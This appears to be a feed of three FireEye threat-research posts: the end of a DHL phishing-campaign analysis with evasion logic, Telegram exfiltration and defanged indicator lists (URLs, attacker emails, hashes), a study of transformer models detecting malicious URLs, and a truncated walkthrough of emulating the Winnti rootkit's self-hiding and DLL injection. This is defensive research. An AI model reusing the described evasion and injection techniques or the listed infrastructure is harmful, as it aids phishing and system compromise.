 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Language resource files</span></p>
 <h5>Evasion</h5>
 <p>This campaign employs a variety of techniques to evade detection.
  This will not serve up a phishing page if the request came from
  certain blocked IP addresses. The backend code (Figure 8) served the
  users with a &quot;HTTP/1.1 403 Forbidden&quot; response header under
  the following conditions:</p>
 <ul> <li>IP has been seen five times (AntiBomb_User func)</li> <li>IP
    host resolves to its list of avoided host names ('google',
    'Altavista', 'Israel', 'M247', 'barracuda', 'niw.com.au' and more)
    (AntiBomb_WordBoot func)</li> <li>IP is on its own local blocklist
    csv (x.csv in the kit) (AntiBomb_Boot func)</li> <li>IP has seen
    POSTing three times (AntiBomb_Block func)</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Backend evasion code</span></p>
 <p>After looking at the list of blocked hosts, we could deduce that the
  attackers were trying to block web crawlers.</p>
 <h5>Data Theft</h5>
 <p>The attackers behind this phishing campaign attempted to steal
  credentials, credit card data, and other sensitive information. The
  stolen data is sent to email addresses and Telegram channels
  controlled by the attacker. We uncovered a Telegram channel where data
  is being sent using the Telegram Bot API shown in Figure 9.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Chat log</span></p>
 <p>While using php <i>mail()</i> function to send stolen credentials is
  quite common, in the near past, encrypted instant messaging
  applications such as Telegram have been used for sending phished
  information back to command and control servers.</p>
 <p>We were able to access one of the Telegram channels controlled by
  the attacker as shown in Figure 10. The sensitive information being
  sent in the chat includes IP addresses and credit card data.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Telegram channel with stolen information</span></p>
 <h4>Conclusion</h4>
 <p>Attackers (and especially phishers) are always on the hunt for new
  ways to evade detection by security products. Obfuscation gives the
  attackers an edge, and makes it harder for security vendors to protect
  their customers.</p>
 <p>By using instant messaging applications, attackers get user data in
  real time and victims have little to respond once their personal
  information is compromised.</p>
 <h4>Indicators of Compromise (IOC)</h4>
 <p>FireEye Email Security utilizing FAUDE (FireEye Advanced URL
  Detection Engine) protects customers from these types of phishing
  threats. Unlike traditional anti-phishing techniques dependent on
  static inspection of phishing URL content, FAUDE uses multiple
  artificial intelligence (AI) and machine learning (ML) engines to more
  effectively thwart these attacks.</p>
 <p>From December 2020 until the time of posting, our FAUDE detection
  engine saw more than 100 unique URLs hosting DHL phishing pages with
  obfuscated source code, including:</p>
 <ul> <li>hxxps://bit[.]ly/2KJ03RH</li>
  <li>hxxps://greencannabisstore[.]com/0258/redirect-new.php</li>
  <li>hxxps://directcallsolutions[.]co[.]za/CONTACT/DHL_HOME/</li>
  <li>hxxps://danapluss[.]com/wp-admin/dhl/home/</li>
    <li>hxxp://r.cloudcyberlink[.]digital/&lt;path&gt; (multiple paths
    using same domain)<i></i></li> </ul>
 <h5>Email Addresses</h5>
 <ul> <li>medmox2k@yandex[.]com</li> <li>o.spammer@yandex[.]com</li>
  <li>cameleonanas2@gmail[.]com</li> </ul>
 <h5>Telegram Users</h5>
 <ul> <li>@Saitama330</li> <li>@cameleon9</li> </ul>
 <h5>style.css</h5>
 <ul> <li>Md5: 83b9653d14c8f7fb95d6ed6a4a3f18eb)</li> <li>Sha256:
  D79ec35dc8277aff48adaf9df3ddd5b3e18ac7013e8c374510624ae37cdfba31</li> </ul>
 <h5>font-woff2</h5>
 <ul> <li>MD5: b051d61b693c76f7a6a5f639177fb820</li> <li>SHA-256:
  5dd216ad75ced5dd6acfb48d1ae11ba66fb373c26da7fc5efbdad9fd1c14f6e3</li> </ul>
 <h5>Domains</h5>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="322" valign="top"><p>Pradosdemojanda[.]com</p> </td> </tr>
    <tr>
      <td width="322"
        valign="top"><p>global-general-trackks.supercarhiredubai[.]com</p>
      </td> </tr>
    <tr>
      <td width="322" valign="top"><p>tracking-dhi.company</p> </td> </tr>
    <tr>
      <td width="322" valign="top"><p>Tapolarivercamp[.]com</p> </td> </tr>
    <tr>
      <td width="322" valign="top"><p>Rosariumvigil[.]com</p> </td> </tr>
    <tr>
      <td width="322" valign="top"><p>Mydhlexpert[.]com</p> </td> </tr>
    <tr>
      <td width="322" valign="top"><p>Autorepairbyfradel[.]com</p> </td> </tr></tbody></table>
 <h5>URLs</h5>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://wantirnaosteo[.]com[.]au/logon/home/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://ekartenerji[.]com[.]tr/wp-admin/images/dk/DHL/home.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://aksharapratishthan[.]org/admin/imagess/F004f19441/sms1.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://royalgateedu[.]com/wp-content/plugins/elementor/includes/libraries/infos/package/F004f19441/00951124a.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://vandahering[.]com[.]br/htacess</p> </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://hkagc[.]com/man/age/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://fiquefitnes[s]comsaude[.]com/.well-known/MARKET/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://www.instantcopywritingscript[.]com/blog/wp-content/22/DHL/MARKET</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://isss[.]sjs[.]org[.]hk/wp-admin/includes/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://www.concordceramic[.]com/fr/frais/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://infomediaoutlet[.]com/oldsite/wp-content/uploads/2017/02/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://wema-wicie[.]pl/dh/l/en/MARKET</p> </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://www.grupoindustrialsp[.]com/DHL/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://marrecodegoias[.]com[.]br/wp-snapshots/activat/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://villaluna[.]de/wp-content/info/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxp://sandur[.]dk/wp-content/upgrade/-/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://chistimvse[.]com/es/dhl/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://detmayviet[.]com/wp-includes/widgets/-/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://dartebreakfast[.]com/wp-content/plugins/dhl-espress/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://genesisdistributors[.]com/-/Tracking/dhl/Tracking/dhl-tracking/F004f19441/00951124a.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://www.goldstartechs[.]com/wp-admin/js/widgets/102/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://universalpublicschooltalwandisabo[.]com/DHL</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://intranet[.]prorim[.]org[.]br/info/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://administrativos[.]cl/mail.php</p> </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://nataliadurandpsicologa[.]com[.]br/upgrade/MARKET/F004f19441/11644210b.php</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://tanaxinvest[.]com/en/dhl/MARKET/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://deepbluedivecenter[.]com/clear/item/</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://keystolivingafulfilledlife[.]com/wp-admin/includes/daspoe99i3mdef/DOCUNTRITING</p>
      </td> </tr>
    <tr>
      <td width="624"
        valign="top"><p>hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php</p>
      </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/01/phishing-campaign-woff-obfuscation-telegram-communications.html2021-01-26T20:45:00.000Z2021-01-26T20:47:27.670ZTraining Transformers for Cyber Security Tasks: A Case Study on
Malicious URL Predictionnoemail@noemail.orgEthan M. Rudd<h4>Highlights       </h4>
 <ul> <li>Perform a case study on using Transformer models to solve
    cyber security problems</li> <li>Train a Transformer model to detect
    malicious URLs under multiple training regimes</li> <li>Compare our
    model against other deep learning methods, and show it performs
    on-par with other top-scoring models</li> <li>Identify issues with
    applying generative pre-training to malicious URL detection, which
    is a cornerstone of Transformer training in natural language
    processing (NLP) tasks</li> <li>Introduce novel loss function that
    balances classification and generative loss to achieve improved
    performance on the malicious URL detection task</li> </ul>
 <h4>Introduction</h4>
 <p>Over the past three years Transformer machine learning (ML) models,
  or “Transformers” for short, have yielded impressive breakthroughs in
  a variety of sequence modeling problems, specifically natural language
  processing (NLP). For example, <a
    href="https://arxiv.org/abs/2005.14165">OpenAI’s latest</a> GPT-3
  model is capable of generating long segments of grammatically-correct
  prose from scratch. Spinoff models, such as those developed for
  question and answering, are capable of correlating context over
  multiple sentences. <a
    href="https://play.aidungeon.io/main/landing">AI Dungeon</a>, a
  single and multiplayer text adventure game, uses Transformers to
  generate plausible unlimited content in a variety of fantasy settings.
  Transformers’ NLP modeling capabilities are apparently so powerful
  that they pose security risks in their own right, in terms of their <a
    href="https://www.theatlantic.com/ideas/archive/2020/09/future-propaganda-will-be-computer-generated/616400/">potential
    power to spread disinformation</a>, yet on the other side of the
  coin, they can be used as powerful tools to detect and mitigate
  disinformation campaigns. For example, in <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/11/combatting-social-media-information-operations-neural-language-models.html">previous
  research</a> by the FireEye Data Science team, a NLP Transformer was
  fine-tuned to detect disinformation on social media sites.</p>
 <p>Given the power of these Transformer models, it seems natural to
  wonder if we can apply them to other types of cyber security problems
  that do not necessarily involve natural language, per se. In this blog
  post, we discuss a case study in which we apply Transformers to
  malicious URL detection. Studying Transformer performance on URL
  detection problem is a first logical step to extending Transformers to
  more generic cyber security tasks, since URLs are not technically
  natural language sequences but share some common characteristics with NLP.</p>
 <p>In the following sections, we outline a typical Transformer
  architecture and discuss how we adapt it to URLs with a
  character-focused tokenization. We then discuss loss functions we
  employ to guide the training of the model, and finally compare our
  training approaches to more conventional ML-based modeling options.</p>
 <h4>Adapting Transformers to URLs</h4>
 <p>Our URL Transformer operates at the character level, where each
  character in the URL corresponds to an input token. When a URL is
  input to our Transformer, it is appended with special tokens—a
  classification token (“CLS”) that conditions the model to produce a
  prediction and padding tokens (“PAD”) that normalize the input to a
  fixed length to allow for parallel training. Each token in the input
  string is then projected into a character embedding space, followed by
  a stack of <a>Attention</a> and <a
    href="https://en.wikipedia.org/wiki/Feedforward_neural_network">Feed-Forward
    Neural Network (FFNN)</a> layers. This stack of layers is similar to
  the architecture introduced in the <a
    href="https://papers.nips.cc/paper/2017/file/3f5ee243547dee91fbd053c1c4a845aa-Paper.pdf">original
    Transformers paper</a>. At a high level, the Attention layers allow
  each input to be associated with long-distance context of other
  characters that are important for the classification task, similar to
  the notion of attention in humans, while the FFNN layers provide
  capacity for learning the relationships among the combination of
  inputs and their respective contexts. An illustration of our
  architecture is shown in Figure 1.<u></u></p>
 <p>Additionally, the URL Transformer employs a masking strategy in its
  Attention calculation, which enforces a left-to-right (L-R)
  dependence. This means that only input characters from the left of a
  given character influence that character’s representation in each
  layer of the attention stack. The network outputs one embedding for
  each input character, which captures all information learned by the
  model about the character sequence up to that point in the input.</p>
 <p>Once the model is trained, we can use the URL Transformer to perform
  several different tasks, such as generatively predicting the next
  character in the input sequence by using the sequence embedding () as
  an input to another neural network with as softmax output over the
  possible vocabulary of characters. A specific example of this is shown
  in Figure 1, where we take the embedding of the input “firee”() and
  use it to predict the next most likely character, “y.” Similarly, we
  can use the embedding produced after the classification token to
  predict other properties of the input sequences, such as their
  likelihood of maliciousness.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/mal-url-prediction/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: High-level overview of the URL
    Transformer architecture</span></p>
 <h4>Loss Functions and Training Regimes</h4>
 <p>With the model architecture in hand, we now turn to the question of
  how we train the model to most effectively detect malicious URLs. Of
  course, we can train this model in a similar way to other supervised
  deep learning classifiers by: (1) making predictions on samples from a
  labeled training set, (2) using a <a
    href="https://en.wikipedia.org/wiki/Loss_function">loss function</a>
  to measure the quality of our predictions, and (3) tune model
  parameters (i.e., weights) via <a
  href="https://en.wikipedia.org/wiki/Backpropagation">backpropagation</a>.
  However, the nature of the Transformer model allows for several
  interesting variations to this <i>training regime</i>. In fact, one of
  the reasons that Transformers have become so popular for NLP tasks is
  because they allow for <a
  href="https://en.wikipedia.org/wiki/Semi-supervised_learning">self-supervised</a>
  generative pre-training, which takes advantage of massive amounts of
  unlabeled data to help the model learn general characteristics of the
  input language before being fine-tuned on the ultimate task at-hand
  (e.g., question answering, sentiment analysis, etc.). Here, we outline
  some of the training regimes we explored for our URL Transformer model.</p>
 <h5>Direct Label Prediction (Decode-To-Label)</h5>
 <p>Using a training set of URLs with malicious and benign labels, we
  can treat the URL Transformer architecture as a feature extractor,
  whose outputs we use as the input to a traditional classifier (e.g.,
  FFNN or even a random forest). When using a FFNN as our classifier, we
  can backpropagate the classification loss (e.g., binary cross-entropy)
  through both the classifier and the Transformer network to adjust the
  weights to perform classification. This training regime is the
  baseline for our experiments and is how most deep learning models are
  trained for classification tasks.</p>
 <h5>Next-Character Prediction Pre-Training and Fine-Tuning</h5>
 <p>Beyond the baseline classification training regime, the NLP
  literature suggests that one can learn a self-supervised embedding of
  the input sequence by training the Transformer to perform a
  next-character prediction task, then fine-tuning the learned
  representation for the classification problem. A key advantage of this
  approach is that data used for pre-training does not require malicious
  or benign labels; instead, the next characters in a URL serve as the
  labels to be predicted from prior characters in the sequence. This is
  similar to the example given in Figure 1, where the embedding output
  is used to predict the next character, “y,” in “fireeye.com.” Overall,
  this training regime allows us to take advantage of the massive amount
  of unlabeled data that is typically available in cyber
  security-related problems.</p>
 <p>The overall structure of the architecture for this regime is similar
  to the aforementioned binary classification task, with FFNN layers
  added for classification. However, since we are now predicting
  multiple classes (i.e., one class per input character in the
  vocabulary), we must apply a softmax function to the output to induce
  a probability distribution over the potential output characters. Once
  the Transformer portion of the network is pre-trained in this way, we
  can swap the FFNN classification layers focused on character
  prediction with new layers that will be trained for the malicious URL
  classification problem, as in the decode-to-label case.</p>
 <h5>Balanced Mixed-Objective Training</h5>
 <p>
  <a href="https://www.usenix.org/system/files/sec19-rudd.pdf">Prior
  work</a> has shown that imbuing the training process with additional
  knowledge outside of the primary task can help constrain the learning
  process, and ultimately result in better models. For instance, a
  malware classifier might train using loss functions that capture
  malicious/benign classification, malware family prediction, and tag
  prediction tasks as a mechanism to provide the classifier with broader
  understanding of the problem than looking at malicious/benign labels
  in isolation.</p>
 <p>Inspired by these findings, we also introduced a mixed-objective
  training regime for our URL Transformer, where we train for binary
  classification and next-character prediction simultaneously. At each
  iteration of training, we compute a loss multiplier such that each
  loss contribution is fixed prior to backpropagation. This ensures that
  neither loss term dominates during training. Specifically, for
  minibatch <i>i</i>, let the net loss <i>L<span
  class="type-XS">Mixed</span></i> be computed as follows:</p>
 <p style="text-align: center;">
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/mal-url-prediction/lmixed.png"
    style="width: 40.0%;height: 40.0%;" alt="" /> </p>
 <p>Given hyperparameters <i style="font-size: 12.0px;">a</i> and <i
  style="font-size: 12.0px;">b</i>, defined such that <i
  style="font-size: 12.0px;">a</i> + <i
  style="font-size: 12.0px;">b</i>: = 1, we compute constant <i
  style="font-size: 12.0px;">a</i> so that the net loss contribution of
    <i style="font-size: 12.0px;">L<span class="type-XS">CLS</span></i>
  to <i style="font-size: 12.0px;">L<span
  class="type-XS">Mixed</span></i> is <i
  style="font-size: 12.0px;">a</i> and the net contribution of <i
      style="font-size: 12.0px;">L<span class="type-XS">Next</span></i>
  to <i style="font-size: 12.0px;">L<span
  class="type-XS">Mixed</span></i> is <i
  style="font-size: 12.0px;">b</i>. For our evaluations, we set <i
  style="font-size: 12.0px;">a</i> := <i
  style="font-size: 12.0px;">b</i> := 0.5, effectively requiring that
  the model equally balance its ability to generate the next character
  and accurately predict malicious URLs.</p>
 <h4>Evaluation</h4>
 <p>To evaluate our URL Transformer model and better understand the
  impact of the three training regimes discussed earlier, we collected a
  training dataset of over 1M labeled malicious and benign URLs, which
  was split into roughly 700K training samples, 100K validation samples,
  and 200k test samples. Additionally, we also developed an unlabeled
  pre-training dataset of 20M URLs.</p>
 <p>Using this data, we performed four different training runs for our
  Transformer model:</p>
 <ol> <li>
    <b>DecodeToLabel (Baseline): </b>Using strictly the binary
    cross-entropy loss on the embedded classification features over the
    entire sequence, we trained the model for 15 epochs using the
    training set.<b></b></li> <li>
    <b>MixedObjective: </b>We trained the model for 15 epochs on the
    training set, using both the embedded classification features and
    the embedded next-character prediction features.</li> <li>
    <b>FineTune: </b>We pre-trained the model for 15 epochs on the
    next-character prediction task using the training set, ignoring the
    malicious/benign labels. We then froze weights over the first 16
    layers of the model and trained the model for an additional 15
    epochs using a binary cross-entropy loss on the classification
  labels.</li> <li>
    <b>FineTune 20M:</b> We performed pre-training on the next-character
    prediction task using the 20M URL dataset, pre-training for 2
    epochs. We then froze weights over the first 16 layers of the
    Transformer and trained for 15 epochs on the binary classification
  task.</li> </ol>
 <p>The ROC curve shown in Figure 2 compares the performance of these
  four training regimes. Here, our baseline DecodeToLabel model (red)
  yielded a ROC curve with 0.9484 AUC, while the MixedObjective model
  (green) slightly outperformed the baseline with an AUC of 0.956.
  Interestingly, both of the fine-tuning models yielded poor
  classification results, which is counter to the established practice
  of these Transformer models in the NLP domain.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/mal-url-prediction/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: ROC curves for four URL
    Transformer training regimes</span></p>
 <p>To assess the relative efficacy of our Transformer models on this
  dataset, we also fit several other types of benchmark models developed
  for URL classification: (1) a Random Forest model on SME-derived
  features, (2) a 1D Convolutional Neural Network (CNN) model on
  character embeddings, and (3) a Long Short-Term Memory (LSTM) neural
  network on character embeddings. Details of these models can be found
  in our <a href="https://arxiv.org/pdf/2011.03040.pdf">white paper</a>,
  however we find that our top performing Transformer model performs
  on-par with the best performing non-Transformer baseline (a 1D CNN
  model), which perhaps indicates that the long-range dependencies
  typically learned by Transformer models are not as useful in the case
  of malicious URL detection.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/mal-url-prediction/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: ROC curves comparing URL
    Transformer to other benchmark URL classification models</span></p>
 <h4>Summary</h4>
 <p>Our experiments suggest that Transformers can achieve performance
  comparable to or better than that of other top-performing models for
  URL classification, though the details of how to achieve that
  performance differ from common practice. Contrary to <a
    href="https://arxiv.org/pdf/1810.04805.pdf?source=post_elevate_sequence_page---------------------------">findings
    from the NLP domain</a>, wherein self-supervised pre-training
  substantially enhances performance in a fine-tuned classification
  task, similar pretraining approaches actually diminish performance for
  malicious URL detection. This suggests that the next character
  prediction task has too little apparent correlation with the task of
  malicious/benign prediction for effective/stable transfer.</p>
 <p>Interestingly, utilizing next-character prediction as an auxiliary
  loss function in conjunction with a malicious/benign loss yields
  improvements over training solely to predict the label. We hypothesize
  that while pre-training leads to a relatively poor generative model
  due to randomized content in the URLs within our dataset, a
  malicious/benign loss may serve to better condition the generative
  model learned by the next-character prediction task, distilling a
  subset of relevant information. It may also be the case that the
  long-distance relationships that are key to the generative
  pre-training task are not as important for the final malicious URL
  classification, as evidenced by the performance of the 1D CNN model.</p>
 <p>Note that we did not perform a rigorous hyperparameter search for
  our Transformer, since this research was primarily concerned with loss
  functions and training regimes. Therefore, it is still an open
  question as to whether a more optimal architecture, specifically
  designed for this classification task, could substantially outperform
  the models described here.</p>
 <p>While our URL dataset is not representative of all data in the cyber
  security space, the difficulty of obtaining a readily fine-tuned model
  from self-supervised pre-training suggests that this approach is
  unlikely to work well for training Transformers on longer sequences or
  sequences with lesser resemblance to natural language (e.g., PE
  files), but an auxiliary loss might work.</p>
 <p>Details about this research and additional results can be found in
  our associated <a href="https://arxiv.org/pdf/2011.03040.pdf">white paper</a>.</p>
http://www.fireeye.com/blog/threat-research/2021/01/training-transformers-for-cyber-security-tasks-malicious-url-prediction.html2021-01-21T17:30:00.000Z2021-01-21T17:34:05.901ZEmulation of Kernel Mode Rootkits With Speakeasynoemail@noemail.orgAndrew Davis<p>In August 2020, we released a blog post about how the <a
    href="https://github.com/fireeye/speakeasy">Speakeasy emulation
  framework</a> can be used to emulate user mode malware such as
  shellcode. If you haven’t had a chance, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/08/emulation-of-malicious-shellcode-with-speakeasy.html">give
    the post a read today</a>.</p>
 <p>In addition to user mode emulation, Speakeasy also supports
  emulation of kernel mode Windows binaries. When malware authors employ
  kernel mode malware, it will often be in the form of a device driver
  whose end goal is total compromise of an infected system. The malware
  most often doesn’t interact with hardware and instead leverages kernel
  mode to fully compromise the system and remain hidden.</p>
 <h4>Challenges With Dynamically Analyzing Kernel Malware</h4>
 <p>Ideally, a kernel mode sample can be reversed statically using tools
  such as disassemblers. However, binary packers just as easily
  obfuscate kernel malware as they do user mode samples. Additionally,
  static analysis is often expensive and time consuming. If our goal is
  to automatically analyze many variants of the same malware family, it
  makes sense to dynamically analyze malicious driver samples.</p>
 <p>Dynamic analysis of kernel mode malware can be more involved than
  with user mode samples. In order to debug kernel malware, a proper
  environment needs to be created. This usually involves setting up two
  separate virtual machines as debugger and debugee. The malware can
  then be loaded as an on-demand kernel service where the driver can be
  debugged remotely with a tool such as WinDbg.</p>
 <p>Several sandbox style applications exist that use hooking or other
  monitoring techniques but typically target user mode applications.
  Having similar sandbox monitoring work for kernel mode code would
  require deep system level hooks that would likely produce significant noise.</p>
 <h4>Driver Emulation</h4>
 <p>Emulation has proven to be an effective analysis technique for
  malicious drivers. No custom setup is required, and drivers can be
  emulated at scale. In addition, maximum code coverage is easier to
  achieve than in a sandbox environment. Often, rootkits may expose
  malicious functionality via I/O request packet (IRP) handlers (or
  other callbacks). On a normal Windows system these routines are
  executed when other applications or devices send input/output requests
  to the driver. This includes common tasks such as reading, writing, or
  sending device I/O control (IOCTLs) to a driver to execute some type
  of functionality.</p>
 <p>Using emulation, these entry points can be called directly with
  doped IRP packets in order to identify as much functionality as
  possible in the rootkit. As we discussed in the first Speakeasy blog
  post, additional entry points are emulated as they are discovered. A
  driver’s DriverMain entry point is responsible for initializing a
  function dispatch table that is called to handle I/O requests.
  Speakeasy will attempt to emulate each of these functions after the
  main entry point has completed by supplying a dummy IRP. Additionally,
  any system threads or work items that are created are sequentially
  emulated in order to get as much code coverage as possible.</p>
 <h4>Emulating a Kernel Mode Implant</h4>
 <p>In this blog post, we will show an example of Speakeasy’s
  effectiveness at emulating a real kernel mode implant family publicly
  named Winnti. This sample was chosen despite its age because it
  transparently implements some classic rootkit functionality. The goal
  of this post is not to discuss the analysis of the malware itself as
  it is fairly antiquated. Rather, we will focus on the events that are
  captured during emulation.</p>
 <p>The Winnti sample we will be analyzing has SHA256 hash
  c465238c9da9c5ea5994fe9faf1b5835767210132db0ce9a79cb1195851a36fb and
  the original file name <span class="code">tcprelay.sys</span>. For
  most of this post, we will be examining the emulation report generated
  by Speakeasy. Note: many techniques employed by this 32-bit rootkit
  will not work on modern 64-bit versions of Windows due to Kernel Patch
  Protection (PatchGuard) which protects against modification of
  critical kernel data structures.</p>
 <p>To start, we will instruct Speakeasy to emulate the kernel driver
  using the command line shown in Figure 1. We instruct Speakeasy to
  create a full memory dump (using the “-d” flag) so we can acquire
  memory later. We supply the memory tracing flag (“-m”) which will log
  all memory reads and writes performed by the malware. This is useful
  for detecting things like hooking and direct kernel object
  manipulation (DKOM).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Command line used to emulate
    the malicious driver</span></p>
 <p>Speakeasy will then begin emulating the malware’s DriverEntry
  function. The entry point of a driver is responsible for setting up
  passive callback routines that will service user mode I/O requests as
  well as callbacks used for device addition, removal, and unloading.
  Reviewing the emulation report for the malware’s DriverEntry function
  (identified in the JSON report with an “ep_type” of “entry_point”),
  shows that the malware finds the base address of the Windows kernel.
  The malware does this by using the ZwQuerySystemInformation API to
  locate the base address for all kernel modules and then looking for
  one named “ntoskrnl.exe”. The malware then manually finds the address
  of the PsCreateSystemThread API. This is then used to spin up a system
  thread to perform its actual functionality. Figure 2 shows the APIs
  called from the malware's entry point.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Key functionality in the
    tcprelay.sys entry point</span></p>
 <h4>Hiding the Driver Object</h4>
 <p>The malware attempts to hide itself before executing its main system
  thread. The malware first looks up the “DriverSection” field in its
  own DRIVER_OBJECT structure. This field holds a linked list containing
  all loaded kernel modules and the malware attempts to unlink itself to
  hide from APIs that list loaded drivers. In the “mem_access” field in
  the Speakeasy report shown in Figure 3, we can see two memory writes
  to the DriverSection entries before and after itself which will remove
  itself from the linked list.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Memory write events
    representing the tcprelay.sys malware attempting to unlink itself in
    order to hide</span></p>
 <p>As noted in the original <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/08/emulation-of-malicious-shellcode-with-speakeasy.html">Speakeasy
    blog post</a>, when threads or other dynamic entry points are
  created at runtime, the framework will follow them for emulation. In
  this case, the malware created a system thread and Speakeasy
  automatically emulated it.</p>
 <p>Moving on to the newly created thread (identified by an “ep_type” of
  “system_thread”), we can see the malware begin its real functionality.
  The malware begins by enumerating all running processes on the host,
  looking for the service controller process named services.exe. It's
  important to note that the process listing that gets returned to the
  emulated samples is configurable via JSON config files supplied at
  runtime. For more information on these configuration options please
  see the Speakeasy README on our <a
    href="https://github.com/fireeye/speakeasy">GitHub repository</a>.
  An example of this configurable process listing is shown in Figure 4.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: Process listing configuration
    field supplied to Speakeasy</span></p>
 <h4>Pivoting to User Mode</h4>
 <p>Once the malware locates the services.exe process, it will attach to
  its process context and begin inspecting user mode memory in order to
  locate the addresses of exported user mode functions. The malware does
  this so it can later inject an encoded, memory-resident DLL into the
  services.exe process. Figure 5 shows the APIs used by the rootkit to
  resolve its user mode exports.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Logged APIs used by
    tcprelay.sys rootkit to resolve exports for its user mode implant</span></p>
 <p>Once the exported functions are resolved, the rootkit is ready to
  inject the user mode DLL component. Next, the malware manually copies
  the in-memory DLL into the services.exe process address space. These
  memory write events are captured and shown in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Memory write events captured
    while copying the user mode implant into services.exe</span></p>
 <p>A common technique that rootkits use to execute user mode code
  involves a Windows feature known as Asynchronous Procedure Calls
  (APC). APCs are functions that execute asynchronously within the
  context of a supplied thread. Using APCs allows kernel mode
  applications to queue code to run within a thread’s user mode context.
  Malware often wants to inject into user mode since much of the common
  functionality (such as network communication) within Windows can be
  more easily accessed. In addition, by running in user mode, there is
  less risk of being detected in the event of faulty code bug-checking
  the entire machine.</p>
 <p>In order to queue an APC to fire in user mode, the malware must
  locate a thread in an “alertable” state. Threads are said to be
  alertable when they relinquish their execution quantum to the kernel
  thread scheduler and notify the kernel that they are able to dispatch
  APCs. The malware searches for threads within the services.exe process
  and once it detects one that’s alertable it will allocate memory for
  the DLL to inject then queue an APC to execute it.</p>
 <p>Speakeasy emulates all kernel structures involved in this process,
  specifically the executive thread object (<span
  class="code">ETHREAD</span>) structures that are allocated for every
  thread on a Windows system. Malware may attempt to grovel through this
  opaque structure to identify when a thread’s alertable flag is set
